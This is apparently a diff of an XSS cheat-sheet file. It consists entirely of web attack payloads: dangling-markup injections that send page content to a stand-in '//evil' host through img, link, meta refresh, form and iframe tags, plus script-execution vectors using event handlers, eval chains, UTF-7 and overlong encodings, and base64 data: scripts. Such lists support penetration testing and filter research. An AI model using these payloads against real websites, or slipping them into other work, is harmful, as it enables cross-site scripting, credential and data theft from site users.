@@ -49,31 +49,32 @@
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <script>alert(document.domain)<\/script>
 <script>alert(document.domain)<\/script>
-<body background=\"\/\/evil?\n<table background=\"\/\/evil?\n<table><thead background=\"\/\/evil?\n<table><tbody background=\"\/\/evil?\n<table><tfoot background=\"\/\/evil?\n<table><td background=\"\/\/evil?\n<table><th background=\"\/\/evil?
-<link rel=stylesheet href=\"\/\/evil?
-<link rel=icon href=\"\/\/evil?
-<meta http-equiv=\"refresh\" content=\"0; http:\/\/evil?
-<img src=\"\/\/evil?\n<image src=\"\/\/evil?
-<video><track default src=\"\/\/evil?
-<video><source src=\"\/\/evil?
-<audio><source src=\"\/\/evil?
-<input type=image src=\"\/\/evil?
-<form><button style=\"width:100%;height:100%\" type=submit formaction=\"\/\/evil?
-<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"\/\/evil?
-<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"\/\/evil?
-<object data=\"\/\/evil?
-<iframe src=\"\/\/evil?
-<embed src=\"\/\/evil?
-<form><button formaction=\/\/evil>XSS<\/button><textarea name=x>
-<button form=x>XSS<\/button><form id=x action=\/\/evil target='
-<a href=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html><font size=100 color=red>You must click me<\/font><\/a><base target=\"
-<form><input type=submit value=\"Click me\" formaction=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html formtarget=\"
-<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"\/\/evil\/
-<embed src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"
-<iframe src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"
-<object data=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"
-<frameset><frame src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"
+<body background=\"//evil?\n<table background=\"//evil?\n<table><thead background=\"//evil?\n<table><tbody background=\"//evil?\n<table><tfoot background=\"//evil?\n<table><td background=\"//evil?\n<table><th background=\"//evil?
+<link rel=stylesheet href=\"//evil?
+<link rel=icon href=\"//evil?
+<meta http-equiv=\"refresh\" content=\"0; http://evil?
+<img src=\"//evil?\n<image src=\"//evil?
+<video><track default src=\"//evil?
+<video><source src=\"//evil?
+<audio><source src=\"//evil?
+<input type=image src=\"//evil?
+<form><button style=\"width:100%;height:100%\" type=submit formaction=\"//evil?
+<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"//evil?
+<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"//evil?
+<object data=\"//evil?
+<iframe src=\"//evil?
+<embed src=\"//evil?
+<form><button formaction=//evil>XSS</button><textarea name=x>
+<button form=x>XSS</button><form id=x action=//evil target='
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"
+<form><input type=submit value=\"Click me\" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=\"
+<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/
+<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
+<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
+<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
+<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"
 <input type=hidden type=image src=\"//evil?
+<video poster=//evil?
 %C0%BCscript>alert(1)<\/script>\n%E0%80%BCscript>alert(1)<\/script>\n%F0%80%80%BCscript>alert(1)<\/script>\n%F8%80%80%80%BCscript>alert(1)<\/script>\n%FC%80%80%80%80%BCscript>alert(1)<\/script>
 <script>\\u0061lert(1)<\/script>
 <script>\\u{61}lert(1)<\/script>
@@ -1001,6 +1002,8 @@ code
 <div ongesturestart=alert(1)>XSS</div>
 <div ongesturechange=alert(1)>XSS</div>
 <div ongestureend=alert(1)>XSS</div>
+<body onpagereveal=alert(1)>
+<* onsecuritypolicyviolation=alert(1)>XSS</*>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
@@ -1090,6 +1093,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <img/src/onerror=\"window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\\x281\\x29'\">
 <img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\\x281\\x29'>
 <img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\\x281\\x29;var\\x20Uncaught//';z>
+<svg onload=onerror=eval;new'\"-alert\\x281\\x29//'>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
